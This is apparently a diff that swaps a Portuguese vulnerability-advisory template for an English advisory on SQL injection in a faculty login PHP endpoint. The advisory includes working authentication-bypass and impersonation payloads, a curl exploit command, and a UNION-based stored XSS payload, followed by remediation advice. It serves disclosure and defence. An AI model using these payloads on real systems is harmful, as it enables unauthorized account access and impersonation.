@@ -1,328 +1,290 @@
-# Advisory de Segurança — [NOME DA VULNERABILIDADE]
 
-> **Identificador:** [CVE-AAAA-NNNNN / ID interno]  
-> **Data de publicação:** [DD/MM/AAAA]  
-> **Última atualização:** [DD/MM/AAAA]  
-> **Severidade:** [Crítica / Alta / Média / Baixa]  
-> **CVSS:** [0.0] — `[VETOR CVSS]`  
-> **CWE:** [CWE-NNN — Nome da fraqueza]  
-> **Status:** [Corrigida / Mitigação disponível / Sem correção / Em investigação]
+# Authentication Bypass via SQL Injection in Faculty Login
 
----
+## Summary
 
-## 1. Resumo executivo
+The `loginlinkfaculty.php` endpoint is vulnerable to **SQL Injection (CWE-89)** because user-controlled input from the `fid` (Faculty ID) and `pass` (Password) parameters is concatenated directly into an SQL query without using prepared statements or parameterized queries.
 
-Foi identificada uma vulnerabilidade em **[produto, sistema ou componente]**, nas versões **[versões afetadas]**, que permite que **[tipo de atacante ou condição necessária]** realize **[ação principal]**.
+An unauthenticated attacker can exploit this vulnerability to bypass authentication, impersonate arbitrary faculty accounts, obtain a valid authenticated PHP session, and potentially chain the issue with other authenticated vulnerabilities.
 
-A exploração bem-sucedida pode resultar em **[impacto principal: execução de código, acesso não autorizado, exposição de dados, elevação de privilégio, indisponibilidade etc.]**.
-
-A organização responsável foi notificada em **[data]** e **[resumo da resposta do fornecedor]**.
+In addition, if the application displays the session variable `$_SESSION["fname"]` without proper output encoding, a UNION-based SQL Injection can be leveraged to achieve **Stored XSS** through the authenticated session.
 
 ---
 
-## 2. Produtos afetados
+## Vulnerability Details
 
-| Produto / Componente | Versões afetadas | Versão corrigida | Status |
-|---|---:|---:|---|
-| [Produto 1] | [Versões] | [Versão] | [Afetado/Corrigido] |
-| [Produto 2] | [Versões] | [Versão] | [Afetado/Corrigido] |
+### Vulnerable Code
 
-### Produtos não afetados
-
-- [Produto ou versão não afetada]
-- [Produto ou versão não afetada]
-
----
-
-## 3. Descrição da vulnerabilidade
-
-A vulnerabilidade ocorre devido a **[causa técnica da falha]**.
-
-O componente **[nome do componente, endpoint, função ou módulo]** não realiza corretamente **[validação, autenticação, autorização, sanitização, controle de acesso, tratamento de sessão etc.]**, permitindo que um atacante **[resultado técnico da exploração]**.
-
-### Condições necessárias
-
-- [Autenticação necessária ou não]
-- [Tipo de usuário ou privilégio necessário]
-- [Acesso local, remoto ou à rede interna]
-- [Interação do usuário, quando aplicável]
-- [Configuração específica necessária]
-
----
-
-## 4. Impacto
-
-A exploração pode permitir:
-
-- [Impacto 1]
-- [Impacto 2]
-- [Impacto 3]
-- [Impacto 4]
-
-### Impacto sobre a confidencialidade
-
-[Descreva se dados podem ser visualizados, extraídos ou expostos.]
-
-### Impacto sobre a integridade
-
-[Descreva se dados, configurações ou operações podem ser alterados.]
-
-### Impacto sobre a disponibilidade
-
-[Descreva se o serviço pode ser interrompido, degradado ou indisponibilizado.]
-
----
-
-## 5. Classificação
-
-### CVSS
-
-- **Pontuação:** [0.0]
-- **Severidade:** [Crítica / Alta / Média / Baixa]
-- **Vetor:** `[CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H]`
-
-### CWE
-
-- **[CWE-NNN — Nome da fraqueza]**
-
-### CAPEC, quando aplicável
-
-- **[CAPEC-NNN — Nome do padrão de ataque]**
-
----
-
-## 6. Cenário de exploração
-
-Um possível cenário de exploração ocorre da seguinte forma:
-
-1. O atacante identifica uma instância vulnerável de **[produto]**.
-2. O atacante envia **[requisição, arquivo, entrada ou payload]** ao componente vulnerável.
-3. A aplicação processa o conteúdo sem **[controle de segurança ausente]**.
-4. O atacante consegue **[resultado da exploração]**.
-5. Como consequência, pode ocorrer **[impacto final]**.
-
----
-
-## 7. Evidências técnicas
-
-### Componente afetado
-
-```text
-[Nome do endpoint, arquivo, classe, função, parâmetro ou módulo]
-```
-
-### Requisição de exemplo
-
-```http
-[MÉTODO] /[CAMINHO] HTTP/1.1
-Host: [HOST]
-Content-Type: [TIPO]
-
-[CORPO DA REQUISIÇÃO OU PARÂMETROS]
-```
-
-### Resposta observada
-
-```http
-HTTP/1.1 [CÓDIGO]
-Content-Type: [TIPO]
-
-[RESPOSTA RELEVANTE]
-```
-
-### Resultado
-
-[Descreva objetivamente o comportamento observado e por que ele comprova a vulnerabilidade.]
-
-> **Nota:** Remova tokens, cookies, credenciais, dados pessoais, endereços internos e outros segredos antes da publicação.
-
----
-
-## 8. Prova de conceito
-
-A prova de conceito abaixo demonstra apenas o comportamento vulnerável e deve ser utilizada exclusivamente em ambientes autorizados.
-
-```bash
-# Comando ou exemplo mínimo para reproduzir a vulnerabilidade
-[POC CONTROLADA]
-```
-
-### Resultado esperado
-
-```text
-[RESULTADO QUE CONFIRMA A VULNERABILIDADE]
-```
-
-### Limitações da PoC
-
-- Não causa indisponibilidade intencional.
-- Não remove ou modifica dados de terceiros.
-- Não cria persistência ou backdoor.
-- Não contém credenciais reais.
-- Não automatiza exploração em massa.
-
-
+```php
 $x = $_POST["fid"];
 $y = $_POST["pass"];
 
-$sql = "select * from facutlytable where FID='" . $x . "' and Pass='" . $y . "'";
+$sql = "SELECT * FROM facutlytable
+        WHERE FID='" . $x . "'
+        AND Pass='" . $y . "'";
+```
 
-Because the input is not sanitized, attackers can inject SQL like:
+Because both parameters are directly concatenated into the SQL statement, an attacker can inject arbitrary SQL syntax.
 
-Bypass de autenticação
+---
 
-Campo FID
+## Impact
 
-' OR '1'='1' -- -
+Successful exploitation allows an attacker to:
+
+- Bypass authentication.
+- Login without valid credentials.
+- Impersonate arbitrary faculty members.
+- Obtain a valid authenticated PHP session.
+- Access protected faculty functionality.
+- Chain with additional authenticated vulnerabilities.
+- Potentially perform Stored XSS using UNION-based SQL Injection.
+
+---
+
+# Proof of Concept
+
+## 1. Classic Authentication Bypass
+
+**Faculty ID**
+
+```text
+1' OR '1'='1' -- -
+```
+
+**Password**
+
+```text
+x
+```
+
+Generated SQL:
+
+```sql
+SELECT *
+FROM facutlytable
+WHERE FID='1'
+OR '1'='1' -- -'
+AND Pass='x'
+```
+
+The comment sequence removes the password verification and the condition `'1'='1'` always evaluates to TRUE, allowing authentication without valid credentials.
+
+---
+
+## 2. Impersonate a Specific Faculty Account
+
+Instead of authenticating as the first returned record, an attacker can directly authenticate as any faculty member by specifying its identifier.
+
+**Faculty ID**
+
+```text
+102' -- -
+```
+
+**Password**
+
+```text
+x
+```
+
+Generated SQL:
+
+```sql
+SELECT *
+FROM facutlytable
+WHERE FID='102' -- -'
+AND Pass='x'
+```
+
+The password validation is removed, allowing login as the faculty member whose `FID` is `102`.
+
+---
+
+## 3. Password Field Bypass
+
+If the application filters the Faculty ID field but not the password field, authentication can still be bypassed.
+
+**Faculty ID**
+
+```text
+x
+```
+
+**Password**
+
+```text
+' OR '1'='1
+```
+
+Generated SQL:
+
+```sql
+WHERE FID='x'
+AND Pass=''
+OR '1'='1'
+```
+
+Due to SQL operator precedence:
+
+```sql
+(FID='x' AND Pass='')
+OR ('1'='1')
+```
+
+The condition always evaluates to TRUE.
+
+---
+
+# Reproduction
+
+## Through the Login Form
+
+Open:
+
+```
+facultylogin.php
+```
+
+Use the following values:
+
+```
+Faculty ID:
+1' OR '1'='1' -- -
+
+Password:
+x
+```
+
+Click **Login**.
+
+The application authenticates successfully and redirects to:
+
+```
+welcomefaculty.php
+```
+
+without requiring valid credentials.
+
+---
+
+## Using curl
+
+```bash
+curl -i -X POST http://172.25.44.135:9292/loginlinkfaculty.php \
+  --data-urlencode "fid=1' OR '1'='1' -- -" \
+  --data-urlencode "pass=x" \
+  -c cookies.txt
+```
+
+Successful exploitation returns:
+
+```
+HTTP/1.1 302 Found
+Location: welcomefaculty.php
+Set-Cookie: PHPSESSID=...
+```
+
+The returned session cookie grants authenticated access to faculty functionality.
+
+---
+
+# Session Abuse
+
+After authentication, the application stores user information inside the PHP session:
+
+```php
+$_SESSION["fidx"] = $row["FID"];
+$_SESSION["fname"] = $row["FName"];
+```
+
+Any subsequent request using the returned `PHPSESSID` is treated as an authenticated faculty member.
+
+---
+
+# Stored XSS via UNION Injection
+
+If `welcomefaculty.php` renders `$_SESSION["fname"]` without output encoding, SQL Injection can be combined with a UNION query to inject arbitrary JavaScript into the session.
+
+Example payload:
+
+```text
+' UNION SELECT
+1,
+'<script>alert(document.domain)</script>',
+3,4,5,6,7,8,9
+-- -
+```
+
+Password:
+
+```text
+x
+```
+
+The injected value becomes:
+
+```php
+$_SESSION["fname"]
+```
+
+If the welcome page later executes:
+
+```php
+echo $_SESSION["fname"];
+```
+
+without using:
+
+```php
+htmlspecialchars()
+```
+
+the payload executes every time the welcome page is loaded during the authenticated session.
+
+This creates a Stored XSS condition through SQL Injection.
+
+---
+
+# Security Impact
+
+- Authentication Bypass
+- Account Impersonation
+- Unauthorized Access
+- Session Hijacking Opportunities
+- Privilege Escalation
+- Stored XSS (when combined with unsafe output)
+- Complete compromise of faculty accounts
+
+---
+
+# CWE
+
+- CWE-89 — Improper Neutralization of Special Elements used in an SQL Command (SQL Injection)
+- CWE-79 — Improper Neutralization of Input During Web Page Generation (Stored XSS, if applicable)
+
+---
+
+# Remediation
+
+- Replace dynamic SQL concatenation with prepared statements.
+- Use parameterized queries for every database operation.
+- Store passwords using `password_hash()` and verify them with `password_verify()`.
+- Encode all user-controlled output using `htmlspecialchars()`.
+- Apply server-side input validation.
+- Implement least-privilege database permissions.
+- Log and monitor authentication anomalies.
+
+---
+
+# References
+
+- https://owasp.org/www-community/attacks/SQL_Injection
+- https://owasp.org/Top10/A03_2021-Injection/
+- https://cwe.mitre.org/data/definitions/89.html
+- https://cwe.mitre.org/data/definitions/79.html
+
 
 <img width="1155" height="470" alt="image" src="https://github.com/user-attachments/assets/bea6f85c-0cb6-42a8-b742-27919ed73b42" />
 
 <img width="1292" height="296" alt="image" src="https://github.com/user-attachments/assets/ce13bbf7-4765-4a17-8dac-edfe67ff78fa" />
-
----
-
-## 9. Passos para reprodução
-
-1. Instale ou acesse a versão **[versão afetada]**.
-2. Configure **[pré-requisito]**.
-3. Acesse **[endpoint ou funcionalidade]**.
-4. Envie **[entrada ou requisição]**.
-5. Observe **[resultado vulnerável]**.
-6. Compare com o comportamento esperado: **[comportamento seguro]**.
-
----
-
-## 10. Mitigação
-
-Até que a correção definitiva seja aplicada, recomenda-se:
-
-- Restringir o acesso ao componente afetado.
-- Desabilitar temporariamente **[função vulnerável]**, quando possível.
-- Aplicar regras de firewall, WAF, proxy reverso ou ACL.
-- Revisar permissões e privilégios associados.
-- Monitorar requisições ou eventos relacionados a **[indicador]**.
-- Invalidar credenciais, tokens ou sessões potencialmente expostos.
-- Manter logs e evidências para investigação.
-
-> As mitigações reduzem o risco, mas podem não eliminar completamente a vulnerabilidade.
-
----
-
-## 11. Correção
-
-A correção foi disponibilizada na versão **[versão corrigida]**.
-
-Recomenda-se:
-
-1. Atualizar imediatamente para **[versão corrigida]** ou superior.
-2. Reiniciar os serviços afetados, quando necessário.
-3. Invalidar sessões e credenciais antigas.
-4. Revisar logs anteriores à atualização.
-5. Confirmar que o comportamento vulnerável não pode mais ser reproduzido.
-
-### Alteração implementada
-
-[Descreva, em alto nível, a correção aplicada pelo fornecedor.]
-
----
-
-## 12. Detecção e indicadores
-
-Possíveis indicadores de exploração:
-
-- Requisições para **[endpoint]** contendo **[padrão]**.
-- Erros incomuns relacionados a **[componente]**.
-- Criação ou modificação inesperada de **[arquivo, usuário ou configuração]**.
-- Execução de processos anormais pelo usuário **[usuário do serviço]**.
-- Conexões de saída não esperadas.
-- Aumento anormal de erros HTTP **[códigos]**.
-
-### Exemplo de busca em logs
-
-```text
-[EXPRESSÃO, REGEX, QUERY SIEM OU FILTRO]
-```
-
----
-
-## 13. Timeline de divulgação
-
-| Data | Evento |
-|---|---|
-| [DD/MM/AAAA] | Vulnerabilidade identificada |
-| [DD/MM/AAAA] | Primeira notificação enviada ao fornecedor |
-| [DD/MM/AAAA] | Confirmação de recebimento |
-| [DD/MM/AAAA] | Vulnerabilidade validada |
-| [DD/MM/AAAA] | CVE solicitada ou reservada |
-| [DD/MM/AAAA] | Correção disponibilizada |
-| [DD/MM/AAAA] | Advisory publicado |
-| [DD/MM/AAAA] | Última atualização |
-
----
-
-## 14. Comunicação com o fornecedor
-
-- **Fornecedor:** [Nome]
-- **Canal utilizado:** [E-mail, formulário, programa de bug bounty, CERT etc.]
-- **Data da primeira notificação:** [DD/MM/AAAA]
-- **Status da resposta:** [Respondido / Sem resposta / Em análise]
-- **Posicionamento do fornecedor:** [Resumo objetivo]
-
----
-
-## 15. Créditos
-
-A vulnerabilidade foi identificada e reportada por:
-
-- **Pesquisador:** [Nome ou pseudônimo]
-- **Organização:** [Nome da organização]
-- **Contato:** [E-mail profissional]
-- **Perfil:** [GitHub, LinkedIn, site ou identificador]
-
-Agradecimentos:
-
-- [Fornecedor]
-- [CERT/CSIRT]
-- [Colaboradores]
-
----
-
-## 16. Referências
-
-- [Link do advisory do fornecedor]
-- [Link do registro CVE]
-- [Link do NVD]
-- [Link da documentação do produto]
-- [Link do CWE]
-- [Link do patch ou commit]
-- [Outras referências técnicas]
-
----
-
-## 17. Histórico de revisões
-
-| Versão | Data | Alteração |
-|---|---|---|
-| 1.0 | [DD/MM/AAAA] | Publicação inicial |
-| 1.1 | [DD/MM/AAAA] | Atualização de versões afetadas |
-| 1.2 | [DD/MM/AAAA] | Inclusão de correção ou novos indicadores |
-
----
-
-## 18. Aviso legal
-
-Este advisory é publicado com finalidade educacional, defensiva e de melhoria da segurança.
-
-As informações apresentadas foram obtidas em ambiente autorizado e divulgadas de forma responsável ou coordenada. O autor não incentiva o uso destas informações para acesso não autorizado, interrupção de serviços, violação de privacidade ou qualquer atividade ilegal.
-
-A utilização das informações deste documento é de responsabilidade exclusiva do leitor.
-
----
-
-## 19. Contato
-
-Para correções, atualizações ou informações adicionais:
-
-- **E-mail:** [E-MAIL]
-- **Site:** [SITE]
-- **Chave PGP:** [LINK OU FINGERPRINT]
